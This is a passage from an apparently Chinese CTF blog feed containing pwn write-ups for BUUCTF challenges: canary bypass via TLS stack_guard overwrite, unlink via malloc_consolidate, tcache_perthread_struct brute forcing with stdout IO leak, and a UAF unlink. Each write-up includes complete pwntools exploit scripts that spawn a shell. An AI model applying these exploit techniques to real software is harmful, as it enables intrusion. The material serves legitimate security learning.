<p>剩下的思路就是先控制rbp为bss段地址，接着执行puts函数泄露libc地址，再控制执行流调用read函数，将one_gadget读入到bss段(因为执行system函数会出现一些错误),最后执行leave;ret将栈迁移到bss段，劫持执行流到刚才读入的one_gadget上。</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:29028&quot;</span>,<span class="string">&quot;buu64-libc-2.27.so&quot;</span>)</span><br><span class="line">pop_rdi=<span class="number">0x0000000000400c03</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x0000000000400c01</span></span><br><span class="line">leave_ret=<span class="number">0x0000000000400955</span></span><br><span class="line">debug(p,<span class="number">0x400A7D</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;How many bytes do you want to send?&quot;</span>,<span class="built_in">str</span>(<span class="number">0x1850</span>))</span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1008</span>+p64(<span class="number">0xdeadbeef</span>)<span class="comment">#0xdeadbeef is canary</span></span><br><span class="line">payload+=p64(<span class="number">0x602030</span>-<span class="number">8</span>+<span class="number">0x180</span>)<span class="comment">#rbp</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(e.got[<span class="string">&#x27;puts&#x27;</span>])+p64(e.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(<span class="number">0x602030</span>+<span class="number">0x180</span>)+p64(<span class="number">0</span>)+p64(e.plt[<span class="string">&#x27;read&#x27;</span>])+p64(leave_ret)</span><br><span class="line">payload=payload.ljust(<span class="number">0x1848</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)<span class="comment">#TLS stack_guard</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">p.send(payload)</span><br><span class="line">libc_base=recv_libc()-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base +<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">p.send(p64(libc_base+search_og(<span class="number">1</span>)))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211272253954.png" alt="image-20221127225322550"></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://kiprey.github.io/2022/08/thread_canary/">浅析 Linux 程序的 Canary 机制 | Kiprey’s Blog</a></p>
<p><a href="https://eternalsakura13.com/2018/04/24/starctf_babystack/">thread stack bypass canary和sixstar ctf babystack writeup | Sakuraのblog (eternalsakura13.com)</a></p>
<p><a href="http://liupzmin.com/2019/09/30/concurrence/tls-summary/">初识Thread Local Storage 兔子先生</a></p>
]]></content>
      <categories>
        <category>buu刷题</category>
      </categories>
      <tags>
        <tag>one_gadget</tag>
        <tag>栈迁移</tag>
        <tag>篡改TLS中stack_guard</tag>
        <tag>绕过canary</tag>
      </tags>
  </entry>
  <entry>
    <title>sleepyHolder_hitcon_2016</title>
    <url>/posts/b1e92899.html</url>
    <content><![CDATA[<h2 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h2><p>通过本题的学习，知道了<strong>malloc consolidate函数可以让fast bin的堆块进行合并，然后放到unsorted bin，同时将下一个堆块的prev inuse位置空</strong>。通过这一点给了我们利用unlink的机会,如果在2.23下我们可以利用UAF，那么即使没有溢出，也可以利用malloc consolidate让下一个堆块的prev inuse置空，最后在被合并的堆块里伪造一个fake chunk即可触发unlink。</p>
<span id="more"></span>

<h2 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略:"></a>保护策略:</h2><img src="../img/image-20221103164307719.png" alt="image-20221103164307719" style="zoom:50%;" />



<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析:"></a>漏洞分析:</h2><img src="../img/image-20221103164509633.png" alt="image-20221103164509633" style="zoom:50%;" />

<p>存在UAF漏洞，但是这里free后去将一个bss段的值给置空了。而这个值被置空决定了后面的show函数和edit函数没法去利用UAF这个点。</p>
<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路:"></a>利用思路:</h2><p>而这道题本身只能申请三种不同大小的堆块，并且每种堆块只能存在一个。</p>
<p>因为三种堆块里两种堆块都比较大，释放掉都能进入unsorted bin，同时没有开PIE保护并且可以篡改函数的got表，因此我们尝试往unlink的方向上考虑。</p>
<p>不过unlink的话我们需要控制堆块的prev inuse位和prev size位，prev size位好说，但是prev inuse位我们通常通过溢出等方式来篡改，而这道题没有溢出仅仅是存在一个被限制的UAF漏洞。</p>
<p>下面我们来说一下如何利用该UAF来完成unlink以及double free。</p>
<p>这个利用的核心就是触发malloc_consolidate函数，将fastbin中的堆块取出来进行合并放到unsorted bin中，同时将下一个堆块的prev inuse位置零。因此我们利用这一点来篡改堆块的prev inuse位，而申请末尾的堆块字节数为8的话，这样就可以控制prev size位了，从而完成unlink的前提。</p>
<p><strong>补充:在glibc2.23中我们申请堆块时，当遍历了fastbin后没有找到需要的堆块，并且需要的堆块大小还位于large bin的范围里(也就是不属于small bin的范围)就会去调用malloc_consolidate函数来整理下零散的堆块碎片。</strong></p>
<blockquote>
<p>布局如下:<br>add 0x28<br>add 0xFA0</p>
<p>delete 0   #此时堆块进入fast bin</p>
<p>add 0x61A80  #因为该堆块非常大，其size属于large bin的范围 于是此时触发malloc consolidate，将fastbin中的堆块放到small bin中</p>
<p>delete 0  #2.23中的针对double free的检测是去判断bins里的第一个地址是否为当前释放的堆块地址，而原本的0号堆块已经进入了small bin中，所以这里可以成功的double free</p>
<p>add 0x28 #将0号堆块申请出来，去往里面写入0x28的数据，此时我们覆盖到下一个堆块的prev size位，而prev inuse位在malloc consolidate的时候就被置为了0，从而完成了unlink前的布局</p>
<p>delete 1#触发unlink</p>
</blockquote>
<h2 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程:"></a>调试过程:</h2><p>上面的调试过程如下:</p>
<p><img src="/../img/image-20221103175804788.png" alt="image-20221103175804788"></p>
<p><img src="/../img/image-20221103180359194.png" alt="image-20221103180359194"></p>
<p><img src="/../img/image-20221103180532202.png" alt="image-20221103180532202"></p>
<p><img src="/../img/image-20221103180819622.png" alt="image-20221103180819622"></p>
<p><img src="/../img/image-20221103180935673.png" alt="image-20221103180935673"></p>
<p>之后触发了unlink后，就是一个常规劫持got表的操作，改free函数的got为puts的plt，然后泄露libc，再改free函数的got为system地址。</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h2><p><a href="https://zikh26.github.io/posts/ad411136.html">tools-函数库 | ZIKH26’s Blog</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:28037&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params"><span class="built_in">type</span>,content</span>):</span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;3. Renew secret\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;What secret do you want to keep?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line">   p.sendafter(<span class="string">&#x27;Tell me your secret:&#x27;</span>,content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">type</span></span>):</span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;3. Renew secret\n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;Which Secret do you want to wipe?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">type</span>,content</span>):</span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;3. Renew secret\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;Which Secret do you want to renew?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line">   p.sendafter(<span class="string">&#x27;Tell me your secret:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">debug(p,<span class="number">0x400E3C</span>,<span class="number">0x400E48</span>,<span class="number">0x400E59</span>,<span class="number">0x400BAA</span>,<span class="number">0x400C81</span>,<span class="number">0x400CB7</span>) </span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">&#x27;ssss&#x27;</span>)   </span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">ptr=<span class="number">0x6020d0</span></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)+p64(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>+p64(e.got[<span class="string">&#x27;atoi&#x27;</span>])*<span class="number">2</span>+p64(e.got[<span class="string">&#x27;free&#x27;</span>]-<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(e.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">atoi_addr=recv_libc()</span><br><span class="line">sys_addr,bin_sh_addr=local_search(<span class="string">&#x27;atoi&#x27;</span>,atoi_addr,libc)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(sys_addr))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/image-20221103181450008.png" alt="image-20221103181450008"></p>
]]></content>
      <categories>
        <category>buu刷题</category>
      </categories>
      <tags>
        <tag>篡改got表</tag>
        <tag>unlink</tag>
        <tag>malloc_consolidate</tag>
      </tags>
  </entry>
  <entry>
    <title>sctf_2019_one_heap</title>
    <url>/posts/7136f841.html</url>
    <content><![CDATA[<h2 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h2><p>在之前做这道题的时候<a href="https://www.cnblogs.com/ZIKH26/articles/16632897.html">SWPUCTF_2019_p1KkHeap</a>,就受到了tcache dup+tcache poisoning来爆破申请tcache_perthread_struct结构体的启发，结果在做这道题的时候就遇见了这种手法。由于还需要打io_leak再次爆破半个字节，因此这种手法成功的概率只有1&#x2F;256。</p>
<span id="more"></span>

<h2 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h2><p><img src="/../img/2706180-20220904232122044-1074256165.png"></p>
<h2 id="漏洞所在-amp-amp-程序分析："><a href="#漏洞所在-amp-amp-程序分析：" class="headerlink" title="漏洞所在&amp;&amp;程序分析："></a>漏洞所在&amp;&amp;程序分析：</h2><h3 id="漏洞所在："><a href="#漏洞所在：" class="headerlink" title="漏洞所在："></a>漏洞所在：</h3><p>存在UAF漏洞如下：</p>
<p><img src="/../img/2706180-20220904232138391-1671777028.png"></p>
<h3 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h3><p>这道题只有add函数和delete函数，并且限制了两个函数的执行次数。delete函数只能执行4次，add函数只能执行15次。</p>
<p>然后delete函数的话只能释放最近一次执行add函数申请出来内存空间的地址。add函数最多只能申请0x7f大小的堆块，也不存在溢出。</p>
<h2 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h2><h3 id="tcache-struct-attack："><a href="#tcache-struct-attack：" class="headerlink" title="tcache_struct_attack："></a>tcache_struct_attack：</h3><p>存在UAF漏洞，我们打一个tcache dup。由于tcache_perthread_struct结构体是和分配出来的堆块存在固定偏移，因此tcache poisoning去修改末尾两个字节即可，改为x000(x我们需要爆破一下，概率为1&#x2F;16，调试的时候关闭ASLR就不用爆破了)。</p>
<p>当爆破成功时，我们就可以将tcache_perthread_struct申请出来了，然后我们就可以控制任意tcache链表中的头指针，以及链表中堆块的数量。</p>
<p>接着我们修改0x250这条链上的count为7，我们将刚刚申请出来的tcache_perthread_struct给释放掉，该堆块的大小为0x250，由于0x250这条链上的count为7了，所以再次释放就进入了unsorted bin中。（如下图） </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011840157.png" alt="image-20230701184011816"></p>
<p>由于下次从这个0x250堆块中分割一定的内存，就可以让unsorted bin中的fd和bk指针落在我们想要的tcache链上。接着再次申请0x10的内存，这样就可以去编辑刚刚的fd和bk指针了，这里我们去编辑bk指针，将其修改为stdout地址(需要爆破)，然后再次释放掉这个0x10的堆块，让其进入fastbin中，等之后使用。</p>
<p>编辑前后，如下图</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011914303.png" alt="image-20230701191427000"></p>
<p>下图是我做出来之后，懒的再关闭ASLR了，所以直接set改了一下内存值。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011914926.png" alt="image-20230701191444666"></p>
<p>然后我们申请一个0x60大小的堆块，就可以申请出来stdout结构体了，打io leak泄露libc地址。</p>
<p>由于之前我们释放了那个0x10的堆块，此时我们再申请回来(它一直在fastbin中),这次写入malloc_hook-8的地址(因为one_gadget都不通，只能用realloc函数来调整栈帧了)</p>
<p>如下图，此时的realloc_hook已经出来了，只要我们申请0x50的堆块，就可以去编辑它了。</p>
<p><img src="/../img/2706180-20220904232259398-1658522953.png"></p>
<p>最终调整栈帧打one_gadget即可获取shell。</p>
<p>完事了关闭ASLR爆破打远程就行了。说实话这个概率是1&#x2F;256，但我的脸比较黑，大多时候要爆个三百次左右才出来。</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h2><p>exp里的tcache_struct_attack函数是我自定义出来的，因为每次想伪造tcache_struct里的数据，都要去数一下对应的size中的值，感觉有一点麻烦，就顺便写了个函数去指定size写下对应count的值以及地址。</p>
<p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">d_d=<span class="number">0x98C</span></span><br><span class="line">d_a=<span class="number">0x99F</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x7f</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    delete()</span><br><span class="line">    delete()</span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,d_d,d_a,0xDB5,0xD2B)</span></span><br><span class="line">    add(<span class="number">0x7f</span>,p16(<span class="number">0xc010</span>))</span><br><span class="line">    add(<span class="number">0x7f</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    payload=tcache_struct_attack(&#123;<span class="number">0x250</span>:<span class="number">7</span>,<span class="number">0x130</span>:<span class="number">1</span>&#125;)</span><br><span class="line">    add(<span class="number">0x7f</span>,payload)</span><br><span class="line">    delete()</span><br><span class="line">    add(<span class="number">0x50</span>,<span class="string">&#x27;abcd&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x10</span>,p64(<span class="number">0</span>)+p16(<span class="number">0x6760</span>))</span><br><span class="line">    </span><br><span class="line">    delete()</span><br><span class="line">    add(<span class="number">0x60</span>,p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    leak_libc=recv_libc()</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3ed8b0</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> libc_base&amp;<span class="number">0xfff</span>==<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;success!!!&quot;</span>)</span><br><span class="line">        pause()</span><br><span class="line">    malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    realloc=libc_base+libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">    one_gadget=search_og(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x10</span>,p64(malloc_hook-<span class="number">8</span>))</span><br><span class="line">    add(<span class="number">0x50</span>,p64(one_gadget+libc_base)+p64(realloc+<span class="number">8</span>))</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    log(<span class="string">&#x27;Number of blasting&#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line">    p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    libc=ELF(<span class="string">&#x27;/home/hacker/Desktop/buu64-libc-2.27.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">    i=i+<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>这里是爆了355次才出来….</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011915114.png" alt="image-20230701191518858"></p>
]]></content>
      <categories>
        <category>buu刷题</category>
      </categories>
      <tags>
        <tag>爆破tcache_perthread_struct</tag>
      </tags>
  </entry>
  <entry>
    <title>jarvisoj_guestbook</title>
    <url>/posts/f118134e.html</url>
    <content><![CDATA[<p>本题考察了 unlink</p>
<span id="more"></span>

<h2 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h2><p><img src="/../img/2706180-20220901212333982-783105096.png"></p>
<h2 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h2><p>在delete函数中，free函数执行后，未将指针置空存在UAF漏洞</p>
<p><img src="/../img/2706180-20220901212347246-2034102819.png"></p>
<p>在读入数据的函数中，未在字符串的末尾添加\x00，来截断字符串，导致show函数中的%s可能泄露出更多的数据</p>
<p><img src="/../img/2706180-20220901212400614-261058314.png"></p>
<p>保护为Partial RELRO，这就意味着我们可以修改got表。</p>
<h2 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h2><p><img src="/../img/2706180-20220901212442314-1247059414.png"></p>
<p>在程序的开始就创建了一个很大的堆块，用于之后存放我们创建的堆块的各种信息。</p>
<p>而我们通常做的堆题，堆块的信息(包括堆块的地址，堆块的大小等等)都记录在了bss段，但是这道题有点特殊，记录在了最开始创建的一个大堆块里。</p>
<p>在delete函数中虽然存在了uaf，但把存放堆块大小和标志位都给置空了，而edit函数中则检查了标志位，因此无法直接释放掉堆块去写入数据。并且我们申请的堆块会自动和0x80对齐。这就意味着我们这道题无法将堆块释放到fastbin中。</p>
<p>在edit函数中虽然再次问了我们size，但是却用了realloc函数，因此这里也无法溢出。</p>
<h2 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h2><p>这道题我们利用的是unlink，而这个题和常规的unlink有些不一样，常规的unlink一般是给个溢出，然后去篡改bss段存放的堆块信息。而这道题不存在溢出，是利用UAF，覆写之前被free掉的堆块的prev_size和size位来达到unlink的。</p>
<p>不过在这之前我们需要先泄露一下地址。</p>
<h3 id="泄露地址："><a href="#泄露地址：" class="headerlink" title="泄露地址："></a>泄露地址：</h3><p>我们先申请四个堆块，分别为chunk1,chunk2,chunk3,chunk4。我们将chunk1和chunk3释放掉，因为释放掉后一定会进入unsorted bin中，如果不用堆块隔开的话，那么刚释放掉的堆块就会和unsorted bin中的堆块合并。同时还要防止和top chunk合并，因此再申请一个chunk4。</p>
<p>此时的chunk1和chunk3的情况如下：</p>
<p><img src="/../img/2706180-20220901220954399-696534232.png"></p>
<p>而在show函数中，对堆块的标志位进行了检查，如果堆块被释放的话，是无法打印出来里面的内容的。但如果我们再将chunk1和chunk3申请出来并写入八字节的数据的话，此时的标志位为1，可以用show函数打印其中的数据，因为输入数据时，没有加上\x00来截断字符串，因此可以将位于unsorted bin中bk指针给泄露出来。(如下)</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011921576.png" alt="image-20230701192109300"></p>
<p>此时我们的exp为：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;u&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;s&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">show()</span><br></pre></td></tr></table></figure>

<p>此时，我们已经拿到了堆地址和libc地址。也就是使用unlink时，那个ptr我们已经有了。因此接下来我们就要伪造堆块的prev_size和size。</p>
<h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p>首先我们需要构造一个fake chunk。其size为0x81 prev_size为0，然后构造一个ptr-0x18和ptr-0x10。ptr为&amp;chunk1的地址。接下来填充垃圾字符，直到原本之前chunk2的位置，然后覆盖已经被释放掉的chunk2的prev_size为0x80(需要和fake chunk的size一样)，而size要为0x90(因为至少要为0x90大于fastbin的范围，否则无法合并，而本题又只能申请跟0x80对齐的size，因此最小满足条件的size就是0x90)。如果是寻常unlink的话，到这里就ok了，因为我们是溢出修改的size，只要<strong>不破坏原本的堆块布局(就是要确保根据我们篡改的size还能够正常的找到top chunk)<strong>，就好了。但是这道题我们并不是溢出，而且没有做一个防止合并的堆块,如果就这样写完的话，释放掉引线堆块，它会和top chunk合并，因此我们需要再写入一定的垃圾数据，然后再布置一个chunk头，这个chunk头的目的就是去做一个防止和top chunk合并的堆块。</strong>而这个chunk头的size不能乱写，必须要保证能根据这个size找到top chunk的地址。</strong></p>
<p>因此这里的布局后的payload应该如下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">0</span>)<span class="comment">#先将这四个堆块全部释放，为之后覆写堆块中的size和prev_size做准备</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0x0</span>)+p64(<span class="number">0x71</span>)</span><br><span class="line">add(<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>

<p>此时堆块的布局如下：</p>
<p><img src="/../img/2706180-20220901221028228-242800843.png"></p>
<p>切记，防止合并堆块的size也很重要，必须要让堆块的地址加上size为top chunk的地址。</p>
<p>然后我们再次释放引线堆块(因为这个堆块已经被释放过了，所以我们要再释放一次)，触发unlink合并。&amp;fake-0x18这个地址被写入大堆块中。</p>
<p>unlink后的大堆块中的数据如下：</p>
<p><img src="/../img/2706180-20220901221041013-1426029960.png"></p>
<p>此时再编辑chunk0就可以修改大堆块中存放的chunk地址了，我们修改atoi的got表，写入system函数地址即可。</p>
<p>最后一点需要注意的就是，edit函数写入atoi的got表时，<strong>顺便篡改一下堆块大小为八字节，不然的话再写入0x120的数据会篡改掉其他函数的got表导致程序崩溃</strong>。</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26866&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">d_d=<span class="number">0x4010EC</span></span><br><span class="line">d_a=<span class="number">0x4010D4</span></span><br><span class="line">d_e=<span class="number">0x4010E0</span></span><br><span class="line">d_s=<span class="number">0x4010C8</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Length of new post: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Enter your post: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Post number: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Length of post: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Enter your post: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Post number: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))  </span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;u&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;s&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">show()</span><br><span 